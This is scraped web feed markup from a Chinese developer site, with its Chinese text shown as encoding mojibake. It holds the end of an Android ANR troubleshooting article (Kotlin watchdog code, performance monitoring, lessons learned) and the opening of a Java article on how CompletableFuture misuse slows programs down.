<span class="hljs-tag">&lt;<span class="hljs-name">androidx.coordinatorlayout.widget.CoordinatorLayout</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">com.google.android.material.appbar.AppBarLayout</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">Toolbar</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">com.google.android.material.appbar.AppBarLayout</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">RecyclerView</span>
        <span class="hljs-attr">app:layout_behavior</span>=<span class="hljs-string">"@string/appbar_scrolling_view_behavior"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">androidx.coordinatorlayout.widget.CoordinatorLayout</span>&gt;</span>
</code></pre>
<h3 data-id="heading-24">æ€§èƒ½ç›‘æ§æ–¹æ¡ˆ</h3>
<h4 data-id="heading-25">æ–¹æ¡ˆA: Firebase Performance Monitoring</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> trace = Firebase.performance.newTrace(<span class="hljs-string">"settings_light_dialog_touch"</span>)
trace.start()

<span class="hljs-keyword">try</span> {
    showLightSettingsDialog()
} <span class="hljs-keyword">finally</span> {
    trace.stop()
}
</code></pre>
<h4 data-id="heading-26">æ–¹æ¡ˆB: è‡ªå®šä¹‰ANRå®ˆå«</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AnrWatchdog</span> : <span class="hljs-type">Thread</span>(<span class="hljs-string">"AnrWatchdog"</span>) {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> handler = Handler(Looper.getMainLooper())
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> checkInterval = <span class="hljs-number">5000L</span>  <span class="hljs-comment">// 5ç§’æ£€æŸ¥ä¸€æ¬¡</span>

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">run</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">while</span> (!isInterrupted) {
            <span class="hljs-keyword">val</span> blockDetected = AtomicBoolean(<span class="hljs-literal">false</span>)

            handler.post {
                blockDetected.<span class="hljs-keyword">set</span>(<span class="hljs-literal">true</span>)
            }

            sleep(checkInterval)

            <span class="hljs-keyword">if</span> (!blockDetected.<span class="hljs-keyword">get</span>()) {
                <span class="hljs-comment">// ä¸»çº¿ç¨‹é˜»å¡è¶…è¿‡5ç§’</span>
                reportAnr(Thread.getAllStackTraces())
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">reportAnr</span><span class="hljs-params">(stackTraces: <span class="hljs-type">Map</span>&lt;<span class="hljs-type">Thread</span>, Array&lt;StackTraceElement&gt;&gt;)</span></span> {
        <span class="hljs-comment">// ä¸ŠæŠ¥åˆ°ç›‘æ§å¹³å°</span>
        Log.e(<span class="hljs-string">"AnrWatchdog"</span>, <span class="hljs-string">"æ£€æµ‹åˆ°ANR"</span>, Exception().apply {
            stackTrace = stackTraces[Looper.getMainLooper().thread] ?: emptyArray()
        })
    }
}

<span class="hljs-comment">// åœ¨Applicationä¸­å¯åŠ¨</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyApplication</span> : <span class="hljs-type">Application</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">()</span></span> {
        <span class="hljs-keyword">super</span>.onCreate()
        AnrWatchdog().start()
    }
}
</code></pre>
<h3 data-id="heading-27">Code Reviewæ£€æŸ¥ç‚¹</h3>
<p>åœ¨ä»£ç å®¡æŸ¥æ—¶,é‡ç‚¹å…³æ³¨ä»¥ä¸‹å‡ ç‚¹:</p>
<ul class="contains-task-list">
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ‰€æœ‰UIçº¿ç¨‹æ“ä½œæ˜¯å¦è€—æ—¶å°äº16ms?(ä¸€å¸§æ—¶é—´)</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦ä½¿ç”¨äº†StrictModeæ£€æµ‹ä¸»çº¿ç¨‹è¿è§„?</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> å¤æ‚è§†å›¾æ˜¯å¦åšäº†æ€§èƒ½æµ‹è¯•?</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> è§¦æ‘¸äº‹ä»¶å¤„ç†æ˜¯å¦æœ‰è¶…æ—¶ä¿æŠ¤?</li>
<li class="task-list-item"><input type="checkbox" disabled="disabled"/> æ˜¯å¦æœ‰å¿…è¦çš„try-catchä¿æŠ¤?</li>
</ul>
<h3 data-id="heading-28">å›¢é˜Ÿæµç¨‹ä¼˜åŒ–</h3>
<ol>
<li><strong>æ€§èƒ½æµ‹è¯•è‡ªåŠ¨åŒ–</strong></li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># åœ¨CI/CDä¸­é›†æˆæ€§èƒ½æµ‹è¯•</span>
./gradlew connectedAndroidTest \
  -Pandroid.testInstrumentationRunnerArguments.class=\
  com.android.settings.PerformanceTest
</code></pre>
<ol start="2">
<li>
<p><strong>ANRç›‘æ§å‘Šè­¦</strong></p>
<ul>
<li>é›†æˆBuglyã€Sentryç­‰APMå·¥å…·</li>
<li>é…ç½®ANRç‡å‘Šè­¦é˜ˆå€¼:&gt;0.1%ç«‹å³å‘Šè­¦</li>
<li>æ¯å‘¨Review ANRæ•°æ®,ä¼˜å…ˆä¿®å¤é«˜é¢‘é—®é¢˜</li>
</ul>
</li>
<li>
<p><strong>æ€§èƒ½å¡ç‚¹è®°å½•</strong></p>
<ul>
<li>å»ºç«‹"æ€§èƒ½é™·é˜±"æ–‡æ¡£,è®°å½•å›¢é˜Ÿè¸©è¿‡çš„å‘</li>
<li>åœ¨æ–°äººåŸ¹è®­ä¸­åˆ†äº«æ€§èƒ½ä¼˜åŒ–æ¡ˆä¾‹</li>
<li>å®šæœŸç»„ç»‡æ€§èƒ½ä¼˜åŒ–æŠ€æœ¯åˆ†äº«</li>
</ul>
</li>
</ol>
<h2 data-id="heading-29">ç»éªŒæ•™è®­:æˆ‘è¸©è¿‡çš„å‘</h2>
<p>è¿™æ¬¡æ’æŸ¥è®©æˆ‘æ·±åˆ»ä½“ä¼šåˆ°å‡ ç‚¹:</p>
<h3 data-id="heading-30">1. æ°¸è¿œä¸è¦å¯¹ç³»ç»ŸAPIçš„æ€§èƒ½åšå‡è®¾</h3>
<p>æˆ‘åŸä»¥ä¸º <code>computeCurrentVelocity()</code> è¿™ç§ç³»ç»ŸAPIåº”è¯¥æ˜¯é«˜åº¦ä¼˜åŒ–çš„,ä¸ä¼šæœ‰æ€§èƒ½é—®é¢˜ã€‚<strong>é”™äº†!</strong> åœ¨å¼‚å¸¸æ•°æ®é¢å‰,ä»»ä½•ç®—æ³•éƒ½å¯èƒ½é€€åŒ–ã€‚</p>
<h3 data-id="heading-31">2. ANRä¸ä¸€å®šæ˜¯ä½ å†™çš„ä»£ç é—®é¢˜</h3>
<p>è¿™æ¬¡ANRçš„ç›´æ¥åŸå› æ˜¯ç³»ç»Ÿè§¦æ‘¸å±é©±åŠ¨äº§ç”Ÿçš„å¼‚å¸¸æ•°æ®,ä½†æœ€ç»ˆæš´éœ²åœ¨åº”ç”¨å±‚ã€‚è¿™æé†’æˆ‘ä»¬:åº”ç”¨å¼€å‘è¦æœ‰é˜²å¾¡æ€§æ€ç»´,ä¸èƒ½å‡è®¾ç³»ç»Ÿæ°¸è¿œæ­£å¸¸ã€‚</p>
<h3 data-id="heading-32">3. æ—¥å¿—æ˜¯æ’æŸ¥é—®é¢˜çš„ç¬¬ä¸€ç”Ÿäº§åŠ›</h3>
<p>å¹¸äºAndroidæä¾›äº†è¯¦ç»†çš„ANR trace,è®©æˆ‘èƒ½å¿«é€Ÿå®šä½åˆ° <code>VelocityTracker</code>ã€‚å¦‚æœæ²¡æœ‰è¿™äº›æ—¥å¿—,å¯èƒ½è¦èŠ±å¥½å‡ å¤©æ—¶é—´ç›²çŒœã€‚</p>
<h3 data-id="heading-33">4. å¿«é€Ÿæ­¢è¡€æ¯”è¿½æ±‚å®Œç¾æ›´é‡è¦</h3>
<p>é¢å¯¹ç”Ÿäº§ç¯å¢ƒçš„ç´§æ€¥Bug,æ–¹æ¡ˆ1(ç¦ç”¨é€Ÿåº¦è¿½è¸ª)è™½ç„¶ä¸å®Œç¾,ä½†5åˆ†é’Ÿå°±èƒ½æ­¢è¡€ã€‚å…ˆè®©ç”¨æˆ·èƒ½ç”¨èµ·æ¥,å†æ…¢æ…¢ä¼˜åŒ–,è¿™æ‰æ˜¯åŠ¡å®çš„å·¥ç¨‹æ€åº¦ã€‚</p>
<h3 data-id="heading-34">5. æ–‡æ¡£å’Œå¤ç›˜åŒæ ·é‡è¦</h3>
<p>å†™è¿™ç¯‡æ–‡ç« çš„è¿‡ç¨‹,ä¹Ÿæ˜¯å¯¹é—®é¢˜çš„å†æ€è€ƒã€‚æŠŠæ’æŸ¥è¿‡ç¨‹è®°å½•ä¸‹æ¥,ä¸ä»…èƒ½å¸®åŠ©å›¢é˜Ÿå…¶ä»–æˆå‘˜é¿å‘,ä¹Ÿèƒ½åœ¨ä¸‹æ¬¡é‡åˆ°ç±»ä¼¼é—®é¢˜æ—¶å¿«é€Ÿå›å¿†èµ·è§£å†³æ€è·¯ã€‚</p>
<h2 data-id="heading-35">ç›¸å…³æ–‡ç« </h2>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top%2Fblog%2Fandroid_stability_performance%2Fandroid-stability-perf-series-readme" target="_blank" title="https://home.wonlab.top/blog/android_stability_performance/android-stability-perf-series-readme" ref="nofollow noopener noreferrer">Androidç¨³å®šæ€§&amp;æ€§èƒ½æ·±å…¥ç†è§£ä¸“æ ä»‹ç»</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top%2Fblog%2Fandroid_stability_performance%2Fcase1-android-ivi-lag-case-analysis-binder-consumed" target="_blank" title="https://home.wonlab.top/blog/android_stability_performance/case1-android-ivi-lag-case-analysis-binder-consumed" ref="nofollow noopener noreferrer">Androidè½¦æœºå¡é¡¿æ¡ˆä¾‹å‰–æ:ä»Binderè€—å°½åˆ°å•ä¾‹ç¼ºå¤±çš„æ·±åº¦æ’æŸ¥</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top%2Fblog%2Fandroid_stability_performance%2Fcase2-anr-audioserver-deadlock-system-failure" target="_blank" title="https://home.wonlab.top/blog/android_stability_performance/case2-anr-audioserver-deadlock-system-failure" ref="nofollow noopener noreferrer">ANRå®æˆ˜åˆ†æï¼šä¸€æ¬¡audioserveræ­»é”å¼•å‘çš„ç³»ç»Ÿçº§æ•…éšœæ’æŸ¥</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fhome.wonlab.top%2Fblog%2Fandroid_stability_performance%2Fcase3-android-black-screen-analysis" target="_blank" title="https://home.wonlab.top/blog/android_stability_performance/case3-android-black-screen-analysis" ref="nofollow noopener noreferrer">ä¸€æ¬¡ Android è½¦æœºé»‘å±é—®é¢˜çš„æ·±åº¦å‰–æï¼šå½“æ˜¾ç¤ºé©±åŠ¨é‡ä¸Šä¸­æ–­é£æš´</a></li>
</ul>
<hr/>
<p><em>å¦‚æœä½ ä¹Ÿé‡åˆ°è¿‡ç±»ä¼¼çš„è¯¡å¼‚é—®é¢˜,æ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«!æœ‰ä»»ä½•ç–‘é—®ä¹Ÿå¯ä»¥éšæ—¶ç•™è¨€è®¨è®ºã€‚</em></p>
<p><em>æœ¬æ–‡åŸºäºçœŸå®æ¡ˆä¾‹æ”¹ç¼–,éƒ¨åˆ†æ•æ„Ÿä¿¡æ¯å·²è„±æ•å¤„ç†ã€‚</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¹¶è¡Œä¸ç­‰äºæ›´å¿«ï¼šCompletableFuture è®©ä½ æ›´æ…¢çš„ 5 ä¸ªå§¿åŠ¿]]></title>    <link>https://juejin.cn/post/7589893746081169449</link>    <guid>https://juejin.cn/post/7589893746081169449</guid>    <pubDate>2026-01-02T01:37:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589893746081169449" data-draft-id="7590054976488882216" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¹¶è¡Œä¸ç­‰äºæ›´å¿«ï¼šCompletableFuture è®©ä½ æ›´æ…¢çš„ 5 ä¸ªå§¿åŠ¿"/> <meta itemprop="keywords" content="åç«¯,æ€§èƒ½ä¼˜åŒ–,Java"/> <meta itemprop="datePublished" content="2026-01-02T01:37:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€åªå«ç…¤çƒçš„çŒ«"/> <meta itemprop="url" content="https://juejin.cn/user/1732486058745054"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¹¶è¡Œä¸ç­‰äºæ›´å¿«ï¼šCompletableFuture è®©ä½ æ›´æ…¢çš„ 5 ä¸ªå§¿åŠ¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1732486058745054/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€åªå«ç…¤çƒçš„çŒ«
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T01:37:52.000Z" title="Fri Jan 02 2026 01:37:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ä¸Šå‘¨çš„æŸä¸€å¤©ï¼Œè¿ç»´åŒå­¦æ‰¾åˆ°æˆ‘è¯´ç”Ÿäº§ç¯å¢ƒçš„è®¢å•å¤„ç†æ¥å£å“åº”æ—¶é—´çªç„¶é£™åˆ°äº† 3 ç§’ã€‚</p>
<p>æˆ‘å…ˆè®©åç«¯åŒå­¦å’Œè¿ç»´ä¸€èµ·æŸ¥ç›‘æ§ï¼ŒCPU ä½¿ç”¨ç‡å€’æ˜¯ä¸é«˜ï¼Œçº¿ç¨‹æ± çš„æ´»è·ƒçº¿ç¨‹æ•°å´æ¶¨åˆ°äº† 500 å¤šã€‚</p>
<p>å†çœ‹äº†çœ¼æœ€è¿‘ä¸Šçº¿çš„ä»£ç ï¼Œé‡Œé¢ä¸€æ®µåŸæœ¬ä¸²è¡Œçš„ä»£ç ï¼Œæ”¹æˆäº† <code>CompletableFuture</code> å¹¶è¡Œå¤„ç†ï¼Œæœ¬æ„è‚¯å®šæ˜¯æƒ³å¿«ä¸€ç‚¹ï¼Œç»“æœåè€Œå˜æ…¢äº†ã€‚</p>
<p>è¿™ä¹Ÿä¸æ˜¯ä¸ªä¾‹ã€‚</p>
<p>å¾ˆå¤šæ—¶å€™æˆ‘ä»¬æ‹¿åˆ°ä¸€æ®µä¸²è¡Œä»£ç ï¼Œç¬¬ä¸€ååº”å°±æ˜¯çœ‹èƒ½ä¸èƒ½æ”¹æˆå¹¶è¡Œï¼Œè§‰å¾—å¤šçº¿ç¨‹è·‘èµ·æ¥è‚¯å®šå¿«ã€‚</p>
<p>ä½†ä¸ªåˆ«æƒ…å†µä¸‹ï¼Œæ”¹å®Œä¹‹åä¸ä»…ä¸ä¼šå˜å¿«ï¼Œå¯èƒ½è¿˜ä¼šæ¯”åŸæ¥è¿˜æ…¢ã€‚</p>
<p>é—®é¢˜å‡ºåœ¨å“ªé‡Œï¼Ÿçº¿ç¨‹æ± ä¸å¤Ÿå¤§å—ï¼Ÿè¿˜æ˜¯æœºå™¨é…ç½®å¤ªä½å—ï¼Ÿå…¶å®ä¸ç„¶ã€‚</p>
<p>çœŸæ­£çš„åŸå› ï¼Œå¯èƒ½è¿˜æ˜¯æˆ‘ä»¬ä½¿ç”¨ CompletableFuture çš„å§¿åŠ¿ä¸æ­£ç¡®ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cf49d84b171e481eba7dd320657d9007~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5LiA5Y-q5Y-r54Wk55CD55qE54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767922671&amp;x-signature=cBPTmOh3ZRTwNMsyNdvL4r%2FQB4E%3D" alt="fullmetal alchemist ed GIF.gif" loading="lazy"/></p>
<h2 data-id="heading-1">ä»»åŠ¡æ‹†çš„å¤ªç¢ï¼šä¸Šä¸‹æ–‡åˆ‡æ¢åƒæ‰äº†æ‰€æœ‰æ”¶ç›Š</h2>
<p>å‡è®¾ä½ è¦å¤„ç† 1000 ä¸ªè®¢å•å·ï¼Œæ¯ä¸ªè®¢å•å·éœ€è¦è°ƒç”¨ä¸€ä¸ªæ–¹æ³•åšæ ¡éªŒï¼Œå•æ¬¡è°ƒç”¨è€—æ—¶ 0.1 æ¯«ç§’ã€‚ä¸²è¡Œå¤„ç†æ€»å…±éœ€è¦ 100 æ¯«ç§’ã€‚ä½ è§‰å¾—ç”¨ CompletableFuture å¹¶è¡Œå¤„ç†ï¼Œå¼€ 10 ä¸ªçº¿ç¨‹åº”è¯¥èƒ½å¿« 10 å€å§ï¼Ÿ</p>
<p>è®©æˆ‘ä»¬å†™ä¸ªæµ‹è¯•ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// ä¸²è¡Œå¤„ç†
long <span class="hljs-attr">start</span> = System.nanoTime()<span class="hljs-comment">;</span>
for (String orderId : orderIds) {
    validateOrder(orderId)<span class="hljs-comment">;</span>
}
long <span class="hljs-attr">serialTime</span> = System.nanoTime() - start<span class="hljs-comment">;</span>

// å¹¶è¡Œå¤„ç†
ExecutorService <span class="hljs-attr">executor</span> = Executors.newFixedThreadPool(<span class="hljs-number">10</span>)<span class="hljs-comment">;</span>
<span class="hljs-attr">start</span> = System.nanoTime()<span class="hljs-comment">;</span>
List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = orderIds.stream()
    .map(orderId -&gt; CompletableFuture.runAsync(
        () -&gt; validateOrder(orderId), executor))
    .collect(Collectors.toList())<span class="hljs-comment">;</span>
CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
long <span class="hljs-attr">parallelTime</span> = System.nanoTime() - start<span class="hljs-comment">;</span>
</code></pre>
<p>ç»“æœä¸²è¡Œç”¨äº† 98 æ¯«ç§’ï¼Œå¹¶è¡Œç”¨äº† 145 æ¯«ç§’ã€‚</p>
<p>ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Ÿ</p>
<p>æ¯æäº¤ä¸€ä¸ª CompletableFutureï¼Œç³»ç»Ÿéƒ½è¦åšä¸€æ¬¡ä»»åŠ¡è°ƒåº¦ï¼Œæ¶‰åŠçº¿ç¨‹å”¤é†’ã€ä¸Šä¸‹æ–‡åˆ‡æ¢ã€CPU ç¼“å­˜å¤±æ•ˆã€‚è¿™äº›å¼€é”€åŠ èµ·æ¥å¯èƒ½å°±è¦å‡ å¾®ç§’ã€‚å½“å•ä¸ªä»»åŠ¡æœ¬èº«åªéœ€è¦ 0.1 æ¯«ç§’æ—¶ï¼Œè°ƒåº¦å¼€é”€å æ¯”å°±å¾ˆé«˜äº†ã€‚1000 ä¸ªä»»åŠ¡å°±æ˜¯ 1000 æ¬¡è°ƒåº¦ï¼Œç´¯ç§¯èµ·æ¥çš„å¼€é”€è¶…è¿‡äº†å¹¶è¡Œå¸¦æ¥çš„æ”¶ç›Šã€‚</p>
<p>æ›´ç¨³å¦¥çš„åšæ³•æ˜¯æŠŠç²’åº¦æ”¶ç²—ï¼Œè®©æ¯ä¸ªä»»åŠ¡è¶³å¤Ÿå¤§ï¼Œè‡³å°‘è¦†ç›–è°ƒåº¦æˆæœ¬ã€‚</p>
<p>æˆ‘ä»¬æ”¹æˆæ¯ 100 ä¸ªè®¢å•å·ä½œä¸ºä¸€æ‰¹ï¼Œæäº¤ä¸€ä¸ª CompletableFutureï¼š</p>
<pre><code class="hljs language-ini" lang="ini">List&lt;CompletableFuture&lt;Void&gt;&gt; <span class="hljs-attr">futures</span> = new ArrayList&lt;&gt;()<span class="hljs-comment">;</span>
for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; orderIds.size(); i += 100) {</span>
    List&lt;String&gt; <span class="hljs-attr">batch</span> = orderIds.subList(i, 
        Math.min(i + 100, orderIds.size()))<span class="hljs-comment">;</span>
    futures.add(CompletableFuture.runAsync(() -&gt; {
        for (String orderId : batch) {
            validateOrder(orderId)<span class="hljs-comment">;</span>
        }
    }, executor))<span class="hljs-comment">;</span>
}
CompletableFuture.allOf(futures.toArray(new CompletableFuture<span class="hljs-section">[0]</span>)).join()<span class="hljs-comment">;</span>
</code></pre>
<p>è¿™æ¬¡åªç”¨äº† 12 æ¯«ç§’ã€‚è°ƒåº¦æ¬¡æ•°ä» 1000 æ¬¡é™åˆ°äº† 10 æ¬¡ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢çš„å¼€é”€å¤§å¹…å‡å°‘ï¼Œå¹¶è¡Œçš„ä¼˜åŠ¿æ‰çœŸæ­£ä½“ç°å‡ºæ¥ã€‚</p>
<p>è¿™å…¶å®å°±æ˜¯æœ€å¸¸è§çš„ç­–ç•¥â€”â€”åˆ†æ‰¹å¤„ç†æˆ–åˆ†ç‰‡å¤„ç†ã€‚</p>
<p>å½“ç„¶è¿˜æœ‰ä¸€ç‚¹ç»éªŒä¸»ä¹‰ï¼Œå•ä¸ªä»»åŠ¡çš„æ‰§è¡Œæ—¶é—´è‡³å°‘è¦åœ¨ 1 æ¯«ç§’ä»¥ä¸Šï¼Œå¹¶è¡Œæ‰æœ‰æ„ä¹‰ã€‚å¦‚æœä»»åŠ¡æœ¬èº«å¾ˆè½»é‡ï¼Œå°±åº”è¯¥æ‰“åŒ…æˆæ‰¹æ¬¡å†æäº¤ã€‚</p>
<h2 data-id="heading-2">å…±äº«èµ„æºï¼šæ‰€æœ‰çº¿ç¨‹æŒ¤åœ¨åŒä¸€æ‰‡é—¨å‰</h2>
<p>å¹¶è¡Œå¤„ç†æ—¶ï¼Œå¦‚æœå¤šä¸ªçº¿ç¨‹éœ€è¦è®¿é—®åŒä¸€ä¸ªèµ„æºï¼Œè¿™ä¸ªèµ„æºå°±ä¼šæˆä¸ºç“¶é¢ˆã€‚æœ€å¸¸è§çš„å°±æ˜¯<strong>æ•°æ®åº“è¿æ¥æ± </strong>ã€‚</p>
<p>æ¯”æ–¹è¯´ç”¨ CompletableFuture å¹¶è¡ŒæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼Œæ¯ä¸ª future éƒ½è¦ä»è¿æ¥æ± æ‹¿ä¸€ä¸ªæ•°æ®åº“è¿æ¥ã€‚è¿æ¥æ± é…ç½®äº† 20 ä¸ªè¿æ¥ï¼Œä½†åŒæ—¶æäº¤äº† 100 ä¸ª CompletableFutureã€‚</p>
<p>ç»“æœå°±æ˜¯ 80 ä¸ªçº¿ç¨‹åœ¨ç­‰å¾…è¿æ¥é‡Šæ”¾ï¼Œç™½ç™½æµªè´¹æ—¶é—´ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">// è¿æ¥æ± åªæœ‰ 20 ä¸ªè¿æ¥
